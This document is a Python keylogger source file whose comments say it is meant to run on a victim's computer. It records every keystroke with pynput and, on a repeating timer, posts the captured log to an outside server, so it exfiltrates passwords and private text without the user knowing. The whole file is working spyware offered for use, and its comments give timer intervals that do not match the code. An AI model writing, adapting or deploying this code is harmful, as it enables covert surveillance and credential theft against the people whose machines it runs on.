# This will be on the victim's computer
# This will be the keylogger
# We are going to record the users keystrokes and store them in a log,
# every 30 seconds we will send the log to our server with 
# the json fetch method
import pynput.keyboard
import threading
import requests
# log is the variable that will store the keystrokes
log = ""

# This function will be called every time a key is pressed
def process_key_press(key):
    global log
    try:
        # lets put an if here to handle the backspace key
        # but first we need to check if log has content
        if key == pynput.keyboard.Key.backspace:
            if len(log) > 0:
                log = log[:-1]
        # lets put an if else to handle enter key
        elif key == pynput.keyboard.Key.enter:
            log = log + "\n"
        # nother elif for shift key
        elif key == pynput.keyboard.Key.shift:
            log = log + ""
        # another elif for tab key
        elif key == pynput.keyboard.Key.tab:
            log = log + "\t"
        # another elif for caps_lock key
        elif key == pynput.keyboard.Key.caps_lock:
            log = log + ""
        else:
            log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "

# This function will send the log to our server
def report():
    global log
    # We are going to send the log to the url 'http://ssh.378lab.cool:11023/'
    # We are going to send the log as a request parameter called log
    response = requests.post('http://ssh.378lab.cool:11023/postLog', data = {'log': log})
    # We are going to clear the log
    log = ""
    # We are going to call the report function every 2.5 seconds
    timer = threading.Timer(5, report)
    timer.start()


# This function will start the keylogger
def start_keylogger():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
    with keyboard_listener:
        report()
        keyboard_listener.join()

start_keylogger()





